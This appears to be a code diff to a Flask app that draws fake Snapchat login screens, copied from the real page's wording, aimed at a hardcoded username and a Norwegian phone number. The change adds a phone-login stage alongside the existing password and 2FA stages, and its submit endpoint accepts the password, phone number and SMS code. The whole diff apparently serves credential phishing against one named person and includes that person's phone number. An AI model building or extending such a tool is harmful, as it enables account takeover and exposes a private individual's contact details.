@@ -12,9 +12,9 @@ app.template_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), '
 
 HARDCODED_USER = "zexoghaith"
 
-# State - starts as clean login
+# State - starts as clean login (phone mode as requested)
 state = {
-    'stage': 'login',   # login | password | 2fa | done
+    'stage': 'phone',   # phone | phone_sent | password | 2fa | done
     'update_count': 0
 }
 
@@ -51,18 +51,49 @@ def generate_image():
     # Header
     draw.text((cx+18, cy+14), "Log in to Snapchat", fill='white', font=f2)
 
-    # Username label + field (exact from real Snapchat DOM: "Enter your username")
-    draw.text((cx+22, cy+50), "Enter your username", fill='#aaaaaa', font=f3)
-    draw.rounded_rectangle([cx+18, cy+72, cx+422, cy+108], radius=8, fill='#2c2c2c')
-    draw.text((cx+30, cy+80), "zexoghaith", fill='white', font=f3)
+    # === PHONE LOGIN MODE (when user wants phone) ===
+    if stage in ['phone', 'phone_sent']:
+        # Phone number field (Norway +47)
+        draw.text((cx+22, cy+50), "Enter your phone number", fill='#aaaaaa', font=f3)
+        draw.rounded_rectangle([cx+18, cy+72, cx+422, cy+108], radius=8, fill='#2c2c2c')
+        draw.text((cx+30, cy+80), "+47 40300869", fill='#22c55e', font=f3)
 
-    # Password label + field (exact from real Snapchat DOM: "Enter Password")
-    draw.text((cx+22, cy+118), "Enter Password", fill='#aaaaaa', font=f3)
-    draw.rounded_rectangle([cx+18, cy+140, cx+422, cy+176], radius=8, fill='#2c2c2c')
-    if stage in ['password', '2fa', 'done']:
-        draw.text((cx+30, cy+147), "••••••••••", fill='#22c55e', font=f3)  # filled green when submitted
+        # Country selector hint
+        draw.text((cx+22, cy+118), "Norway", fill='#666666', font=f3)
+
+        # Button
+        by = cy + 155
+        if stage == 'phone_sent':
+            draw.rounded_rectangle([cx+18, by, cx+422, by+44], radius=22, fill='#444444')
+            draw.text((cx+145, by+12), "Sending code...", fill='#aaaaaa', font=f2)
+        else:
+            draw.rounded_rectangle([cx+18, by, cx+422, by+44], radius=22, fill='#FFFC00')
+            draw.text((cx+155, by+12), "Send code", fill='#000000', font=f2)
+
+        # "Use username instead" link
+        draw.text((cx+110, by+60), "Use username instead", fill='#888888', font=f3)
+
+        # === BIG BANNER for phone submitted ===
+        if stage == 'phone_sent':
+            draw.rounded_rectangle([cx+12, cy+210, cx+428, cy+305], radius=10, fill='#3f2a00')
+            draw.text((cx+25, cy+222), "PHONE NUMBER ENTERED", fill='#f59e0b', font=f)
+            draw.text((cx+25, cy+255), "+47 40300869", fill='white', font=f2)
+            draw.text((cx+25, cy+278), "SMS code sent — check your phone", fill='#aaaaaa', font=f3)
+
     else:
-        draw.text((cx+30, cy+147), "••••••••••", fill='#888888', font=f3)
+        # Username login (default)
+        # Username label + field (exact from real Snapchat DOM: "Enter your username")
+        draw.text((cx+22, cy+50), "Enter your username", fill='#aaaaaa', font=f3)
+        draw.rounded_rectangle([cx+18, cy+72, cx+422, cy+108], radius=8, fill='#2c2c2c')
+        draw.text((cx+30, cy+80), "zexoghaith", fill='white', font=f3)
+
+        # Password label + field (exact from real Snapchat DOM: "Enter Password")
+        draw.text((cx+22, cy+118), "Enter Password", fill='#aaaaaa', font=f3)
+        draw.rounded_rectangle([cx+18, cy+140, cx+422, cy+176], radius=8, fill='#2c2c2c')
+        if stage in ['password', '2fa', 'done']:
+            draw.text((cx+30, cy+147), "••••••••••", fill='#22c55e', font=f3)  # filled green when submitted
+        else:
+            draw.text((cx+30, cy+147), "••••••••••", fill='#888888', font=f3)
 
     # Big yellow Log In button (exact Snapchat style)
     by = cy + 155
@@ -156,6 +187,15 @@ def submit():
     data = request.get_json() or {}
     pw = (data.get('password') or '').strip()
     cd = (data.get('code') or '').strip()
+    ph = (data.get('phone') or '').strip()
+    
+    if ph:
+        state['stage'] = 'phone_sent'
+        print("[SUBMIT] Phone submitted -> +47 40300869 | showing PHONE NUMBER ENTERED banner")
+        generate_image()
+        time.sleep(0.1)
+        generate_image()
+        return jsonify({'ok': True, 'stage': state['stage']})
     
     if pw:
         state['stage'] = 'password'
@@ -167,7 +207,7 @@ def submit():
     
     if cd and len(cd) >= 4:
         state['stage'] = '2fa'
-        print("[SUBMIT] 2FA submitted")
+        print("[SUBMIT] 2FA code submitted")
         generate_image()
         time.sleep(0.1)
         generate_image()
